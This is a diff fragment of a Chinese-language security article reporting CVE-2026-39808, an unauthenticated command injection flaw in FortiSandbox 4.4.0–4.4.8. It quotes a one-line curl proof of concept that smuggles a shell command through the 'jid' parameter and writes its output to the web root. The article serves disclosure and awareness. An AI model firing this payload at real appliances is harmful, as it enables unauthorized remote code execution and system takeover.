@@ -35,7 +35,7 @@ CVE-2026-39808 是影响 FortiSandbox 的操作系统命令注入漏洞。FortiS
   
 经确认，FortiSandbox 4.4.0 至 4.4.8 版本均受此漏洞影响。该漏洞最令人担忧之处在于其利用难度极低——研究人员 samu-delucas 在 GitHub 发布的 PoC 显示，仅需一条 curl 命令即可实现未经认证的远程代码执行（RCE）：  
 ```
-curl -s -k --get "http://$HOST/fortisandbox/job-detail/tracer-behavior" --data-urlencode "jid=|(id > /web/ng/out.txt)|"
+curl -s -k --get "http://$HOST/fortisandbox/job-detail/tracer-behavior" --data-urlencode "jid=|(id > /web/ng/out.txt)|"
 ```  
   
 在此示例中，攻击者将命令输出重定向至 web 根目录下的文件，随后可通过浏览器获取该文件。这意味着攻击者无需登录即可读取敏感文件、植入恶意软件或完全控制主机系统。  
